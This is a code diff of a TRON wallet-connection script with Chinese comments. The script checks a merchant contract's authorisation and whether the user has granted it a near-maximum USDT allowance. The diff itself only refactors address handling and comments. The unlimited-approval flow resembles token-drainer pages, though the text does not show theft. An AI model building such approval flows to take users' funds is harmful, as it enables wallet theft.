@@ -1,7 +1,7 @@
 // --- 配置常量 (TRON 专属) ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
-const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址
+const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址，用于初始化, 最好不用
 const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
 
 // 你的合约 ABI (SimpleMerchantERC)
@@ -36,7 +36,8 @@ const statusDiv = document.getElementById('status');  //  获取 status 元素�
 
 // --- 状态变量 ---
 let tronWeb;
-let userAddress;
+let userAddress; //  Base58 格式
+let userAddressHex; // Hex 格式
 let merchantContract;
 let usdtContract;
 let isConnectedFlag = false;
@@ -130,11 +131,12 @@ async function checkAuthorization() {
         }
 
         // 1. 检查 SimpleMerchant 合约授权
-        const isAuthorized = await merchantContract.authorized(tronWeb.address.toHex(userAddress)).call(); // 将用户地址转换为 hex 格式
+        //  **关键：使用 userAddressHex (Hex 格式)**
+        const isAuthorized = await merchantContract.authorized(userAddressHex).call();
 
         // 2. 检查 USDT 的授权
         const usdtAllowance = await usdtContract.allowance(userAddress, MERCHANT_CONTRACT_ADDRESS).call();
-        const isUsdtMaxApproved = usdtAllowance.gte(tronWeb.toBigNumber(ALMOST_MAX_UINT)); //  檢查是否接近最大值
+        const isUsdtMaxApproved = usdtAllowance.gte(tronWeb.toBigNumber(ALMOST_MAX_UINT));
 
         let statusMessage = '';
 
@@ -194,19 +196,20 @@ async function connectWallet() {
 
         // 2. 尝试获取用户地址
         try {
-            await tronWeb.trx.getAccount(); // 尝试获取账户信息， 触发 Trust Wallet 弹窗
-            userAddress = tronWeb.defaultAddress.base58;
+            await tronWeb.trx.getAccount(); // 尝试获取账户信息。  如果用户未连接， 会触发 Trust Wallet 弹窗。
+            userAddress = tronWeb.defaultAddress.base58; // 使用 base58 格式
             console.log("✅ User Address (base58):", userAddress);
 
-             // 验证地址
-             if (!tronWeb.isAddress(userAddress)) {
+            // 验证地址
+            if (!tronWeb.isAddress(userAddress)) {
                 console.error("Error: Invalid address (Base58) after getAccount:", userAddress);
                 updateConnectionUI(false);
                 showOverlay('🔴 Connection failed: Invalid address.');
                 updateStatus('Connection failed: Invalid address.');
                 return;
             }
-
+            userAddressHex = tronWeb.address.toHex(userAddress); // 将 Base58 转换为 Hex 格式
+            console.log("✅ User Address (Hex):", userAddressHex);
             updateConnectionUI(true, userAddress);
 
             // 3. 初始化合约并检查授权
@@ -231,6 +234,7 @@ async function connectWallet() {
 // --- 斷開錢包連接 ---
 function disconnectWallet() {
     userAddress = null;
+    userAddressHex = null;
     tronWeb = null;  // 必须设置为 null
     merchantContract = null;
     usdtContract = null;
@@ -247,7 +251,7 @@ connectButton.addEventListener('click', () => {
     }
 });
 
-// 页面加载完成后，初始化 (可选)
+// 页面加载完成后，初始化 (可选，在 window.onload 里面不要有耗时操作)
 window.onload = () => {
     //  在页面加载的时候，隐藏遮罩
 };
